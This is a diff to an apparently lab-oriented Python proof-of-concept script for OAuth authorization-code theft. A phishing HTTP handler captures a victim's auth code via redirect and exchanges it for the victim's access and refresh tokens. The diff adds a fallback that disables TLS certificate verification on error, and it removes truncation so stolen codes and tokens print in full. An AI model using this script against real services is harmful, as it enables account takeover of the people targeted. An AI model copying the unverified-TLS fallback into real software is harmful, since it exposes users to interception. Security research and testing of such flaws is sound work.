@@ -153,8 +153,19 @@ def decode_jwt(token):
 
 def https_request(method, host, path, body=None, headers=None, timeout=15):
     """Make HTTPS request, return (status, response_body_str)."""
-    ctx = ssl.create_default_context()
-    conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
+    try:
+        ctx = ssl.create_default_context()
+        conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
+        conn.request(method, path, body=body, headers=headers or {})
+        resp = conn.getresponse()
+        raw = resp.read().decode()
+        status = resp.status
+        conn.close()
+        return status, raw
+    except ssl.SSLCertVerificationError:
+        # Fallback: macOS Python often lacks system CA certs
+        ctx = ssl._create_unverified_context()
+        conn = http.client.HTTPSConnection(host, timeout=timeout, context=ctx)
     conn.request(method, path, body=body, headers=headers or {})
     resp = conn.getresponse()
     raw = resp.read().decode()
@@ -260,7 +271,7 @@ class PhishingHandler(http.server.BaseHTTPRequestHandler):
             print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
             print(f"  {RED}{BOLD}  *** VICTIM AUTH CODE CAPTURED! ***{RESET}")
             print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
-            print(f"  {RED}  Code: {captured_code[:50]}...{RESET}")
+            print(f"  {RED}  Code: {captured_code}{RESET}")
             print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
 
             captured_event.set()
@@ -462,7 +473,7 @@ def main():
         fail(f"Login failed: {data}")
         fail("Ensure setup_f5_admin.py has been run first!")
         return 1
-    success(f"Login successful — token: {attacker_token[:40]}...")
+    success(f"Login successful — token: {attacker_token}")
 
     # ══════════════════════════════════════════════════════════════
     # STEP 2: Set up callback endpoint
@@ -628,7 +639,7 @@ def main():
         return 1
 
     success("Victim auth code captured!")
-    info(f"Auth code: {captured_code_local[:50]}...")
+    info(f"Auth code: {captured_code_local}")
     results.append(("Auth code captured via redirect", True))
 
     # ══════════════════════════════════════════════════════════════
@@ -663,8 +674,8 @@ def main():
     {BOLD}Full Name    :{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
     {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
     {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
-    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
-    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}
+    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token']}{RESET}
+    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')}{RESET}
 
   {YELLOW}{BOLD}Attacker now has full access to victim's account!{RESET}
 """)
